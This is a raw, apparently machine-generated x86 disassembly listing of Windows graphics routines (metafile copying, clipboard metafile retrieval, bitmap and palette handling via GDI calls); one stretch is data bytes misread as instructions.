pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402d28
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4271e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_419524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402d44
retn
sub_4271f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_403728
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
movzx eax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_419524
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_419524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42731a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402d44
retn
call sub_4248b8
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_4256b8
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_427333
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_402d28
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427313
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_427340
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_426adc
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_424828
sub_4273c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4273f8
push ebx
push esi
push edi
add esp 0xffffff9c
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426adc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f54
mov eax [ rw-data ]
push eax
push 0x9ec
push edi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f18
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f54
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_426f18
jmp r-xdata
mov [ eax + 0x1c ] esi
mov [ eax + 0x20 ] edi
jmp r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4274b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x75
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jne r-xdata
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
add [ eax + eax ] ah
add [ eax ] ah
and [ edx ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ esi + esi * 2 + 0x6eac0042 ] ch
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add ah al
inc esi
inc edx
add [ eax + 0x78004246 ] dh
ja r-xdata
call sub_4167c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4243f4
test al al
je r-xdata
jae r-xdata
dec edx
add al ch
cmp dh dh
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4275be
push [ fs : eax ]
retn
shl [ esi * 2 + 0xd070042 ] 0x54
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
rcl [ ebp + 0x68 ] 0xe6
jne r-xdata
jbe r-xdata
popad
outsb
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4275ed
rcl [ ebp + 0x68 ] 0xbe
jne r-xdata
jae r-xdata
xor eax eax
pop edx
xor [ ecx ] al
add [ eax ] al
add [ edi + edi * 8 + 0x30 ] ah
mov eax [ rw-data ]
call sub_416bf4
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4276d8
add [ edi + edi * 8 + 0x30 ] ah
jo r-xdata
je r-xdata
mov [ ebp - 0x4 ] eax
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
jbe r-xdata
popad
outsb
add [ eax + 0x40042 ] cl
or [ edi + 0x72 ] al
popad
jo r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424450
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416b90
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4275e6
push [ fs : eax ]
sub_427548
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416b90
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4275e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4275ed
mov eax [ rw-data ]
call sub_416bf4
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4275be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4276d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424450
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4243f4
test al al
je r-xdata
sub_4275f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416b90
mov esi eax
xor ecx ecx
push ebp
push sub_427664
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
mov edx ebx
mov eax esi
call sub_4167c8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4276d8
sub_427670
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424018
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4276ac
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_4276d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4240dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4276d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4242e0
xor edx edx
push ebp
push sub_42776c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4245e4
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_416ba4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424450
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_427778
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4242e0
xor eax eax
push ebp
push sub_427857
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428b8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4275f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428c8c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4245e4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_416b08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424450
retn
sub_427868
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403f64
sub_427888
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4275f4
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40f8bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4278e4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
call sub_4275f4
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_4227d0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4275f4
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
push eax
call DeleteObject
sub_427930
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4250fc
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4279df
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4279ec
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
movzx edx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_427a38
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4275f4
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424960
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_428086
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_402d28
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_427d90
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424840
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424960
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424960
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424960
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424960
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_428037
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_428026
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_428004
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424960
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4279ec
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_402f9c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4250fc
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423efc
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423140
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
call sub_423140
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4248b8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42800b
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_427fda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424960
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402d44
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423140
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
call sub_423140
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423140
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
call sub_423140
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_404884
call sub_404884
jmp r-xdata
sub_42802d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42803c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_404800
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42809c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
